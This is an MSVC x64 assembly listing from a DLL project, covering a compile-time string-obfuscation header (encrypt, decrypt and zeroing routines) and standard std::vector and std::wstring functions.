; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<17,-3520361701531608807,char>::~obfuscated_data<17,-3520361701531608807,char>, COMDAT

; 128  : 		{

	xorps	xmm0, xmm0

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	mov	BYTE PTR [rcx+16], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<17,-3520361701531608807,char>::~obfuscated_data<17,-3520361701531608807,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@AEBV?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@AEBV?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@1@@Z PROC ; ay::obfuscated_data<17,-3520361701531608807,char>::obfuscated_data<17,-3520361701531608807,char>, COMDAT

; 118  : 		obfuscated_data(const obfuscator<N, KEY, CHAR_TYPE>& obfuscator)

	mov	r9, rcx

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+17], 1
	add	rcx, 16
	lea	rax, QWORD PTR [rdx+16]
	cmp	r9, rax
	ja	SHORT $LN10@obfuscated
	cmp	rcx, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	r8, r9
	sub	rdx, r9
	mov	ecx, 17
	npad	12
$LL15@obfuscated:
	movzx	eax, BYTE PTR [rdx+r8]
	mov	BYTE PTR [r8], al
	lea	r8, QWORD PTR [r8+1]
	sub	rcx, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	movups	xmm0, XMMWORD PTR [rdx]
	movzx	eax, BYTE PTR [rdx+16]
	movups	XMMWORD PTR [r9], xmm0
	mov	BYTE PTR [r9+16], al

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
??0?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@AEBV?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@1@@Z ENDP ; ay::obfuscated_data<17,-3520361701531608807,char>::obfuscated_data<17,-3520361701531608807,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?data@?$vector@_WV?$allocator@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
this$ = 8
?data@?$vector@_WV?$allocator@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::data, COMDAT

; 1791 :         return _STD _Unfancy_maybe_null(_Mypair._Myval2._Myfirst);

	mov	rax, QWORD PTR [rcx]

; 1792 :     }

	ret	0
?data@?$vector@_WV?$allocator@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z
_TEXT	SEGMENT
this$ = 8
_Val$ = 16
?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::push_back, COMDAT

; 870  :     _CONSTEXPR20 void push_back(_Ty&& _Val) {

	mov	r8, rdx

; 775  :         if (_Mylast != _My_data._Myend) {

	mov	rdx, QWORD PTR [rcx+8]
	cmp	rdx, QWORD PTR [rcx+16]
	je	SHORT $LN4@push_back

; 791  :             _Construct_in_place(*_Mylast, _STD forward<_Valty>(_Val)...);

	movzx	eax, WORD PTR [r8]
	mov	WORD PTR [rdx], ax

; 792  :         } else {
; 793  :             _ASAN_VECTOR_EXTEND_GUARD(static_cast<size_type>(_Mylast - _My_data._Myfirst) + 1);
; 794  :             _Alty_traits::construct(_Getal(), _Unfancy(_Mylast), _STD forward<_Valty>(_Val)...);
; 795  :             _ASAN_VECTOR_RELEASE_GUARD;
; 796  :         }
; 797  : 
; 798  :         _Orphan_range(_Mylast, _Mylast);
; 799  :         _Ty& _Result = *_Mylast;
; 800  :         ++_Mylast;

	add	QWORD PTR [rcx+8], 2

; 871  :         // insert by moving into element at end, provide strong guarantee
; 872  :         _Emplace_one_at_back(_STD move(_Val));
; 873  :     }

	ret	0
$LN4@push_back:

; 779  :         return *_Emplace_reallocate(_Mylast, _STD forward<_Valty>(_Val)...);

	jmp	??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t>
?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::push_back
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ PROC	; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >, COMDAT

; 760  :     _CONSTEXPR20 ~vector() noexcept {

$LN35:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN5@vector

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
	sar	rdx, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	add	rdx, rdx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN24@vector

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN21@vector

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN24@vector:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 2054 :             _Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 2055 :             _Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN5@vector:

; 766  :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN21@vector:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN32@vector:
??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ENDP	; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
??B?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<38,-7115718816596162265,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAXXZ ; ay::obfuscated_data<38,-7115718816596162265,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<38,-7115718816596162265,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<38,-7115718816596162265,char>::~obfuscated_data<38,-7115718816596162265,char>, COMDAT

; 128  : 		{

	xorps	xmm0, xmm0

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	movups	XMMWORD PTR [rcx+16], xmm0
	mov	DWORD PTR [rcx+32], eax
	mov	WORD PTR [rcx+36], ax

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<38,-7115718816596162265,char>::~obfuscated_data<38,-7115718816596162265,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@AEBV?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@AEBV?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@1@@Z PROC ; ay::obfuscated_data<38,-7115718816596162265,char>::obfuscated_data<38,-7115718816596162265,char>, COMDAT

; 118  : 		obfuscated_data(const obfuscator<N, KEY, CHAR_TYPE>& obfuscator)

	mov	r8, rcx

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+38], 1
	add	rcx, 37					; 00000025H
	lea	rax, QWORD PTR [rdx+37]
	cmp	r8, rax
	ja	SHORT $LN10@obfuscated
	cmp	rcx, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	rax, r8
	sub	rdx, r8
	mov	r9d, 38					; 00000026H
	npad	11
$LL15@obfuscated:
	movzx	ecx, BYTE PTR [rdx+rax]
	mov	BYTE PTR [rax], cl
	lea	rax, QWORD PTR [rax+1]
	sub	r9, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, r8
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	eax, DWORD PTR [rdx+32]
	movups	xmm0, XMMWORD PTR [rdx]
	movups	xmm1, XMMWORD PTR [rdx+16]
	movups	XMMWORD PTR [r8], xmm0
	movups	XMMWORD PTR [r8+16], xmm1
	mov	DWORD PTR [r8+32], eax
	movzx	eax, WORD PTR [rdx+36]
	mov	WORD PTR [r8+36], ax

; 124  : 			}
; 125  : 		}

	mov	rax, r8
	ret	0
??0?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@AEBV?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@1@@Z ENDP ; ay::obfuscated_data<38,-7115718816596162265,char>::obfuscated_data<38,-7115718816596162265,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?end@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?end@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::end, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 7

; 2226 :         value_type* _Result = _Bx._Buf;

	mov	r8, rcx

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN5@end

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rcx]
$LN5@end:

; 3967 :         return iterator(

	mov	rax, QWORD PTR [rcx+16]
	lea	rcx, QWORD PTR [r8+rax*2]
	mov	rax, rdx

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rdx], rcx

; 3968 :             _Refancy<pointer>(_Mypair._Myval2._Myptr()) + static_cast<difference_type>(_Mypair._Myval2._Mysize),
; 3969 :             _STD addressof(_Mypair._Myval2));
; 3970 :     }

	ret	0
?end@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??0?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 8
__param0$ = 16
__param1$dead$ = 24
??0?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z PROC ; std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >, COMDAT

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	ret	0
??0?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z ENDP ; std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?begin@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?begin@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::begin, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 7

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN17@begin

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rcx]

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rdx], rax

; 3959 :         return iterator(_Refancy<pointer>(_Mypair._Myval2._Myptr()), _STD addressof(_Mypair._Myval2));
; 3960 :     }

	mov	rax, rdx
	ret	0
$LN17@begin:

; 1851 :     _CONSTEXPR20 _String_const_iterator(pointer _Parg, const _Container_base* _Pstring) noexcept : _Ptr(_Parg) {

	mov	QWORD PTR [rdx], rcx

; 3959 :         return iterator(_Refancy<pointer>(_Mypair._Myval2._Myptr()), _STD addressof(_Mypair._Myval2));
; 3960 :     }

	mov	rax, rdx
	ret	0
?begin@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::begin
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 3179 :     _CONSTEXPR20 ~basic_string() noexcept {

$LN42:
	push	rbx
	sub	rsp, 32					; 00000020H

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rcx+24]

; 3179 :     _CONSTEXPR20 ~basic_string() noexcept {

	mov	rbx, rcx

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rdx, 7

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN16@basic_stri
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rcx]
	lea	rdx, QWORD PTR [rdx*2+2]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN30@basic_stri

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN27@basic_stri

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN30@basic_stri:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN16@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	xor	eax, eax

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 7
	mov	QWORD PTR [rbx+16], rax

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	WORD PTR [rbx], ax

; 3187 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN27@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN39@basic_stri:
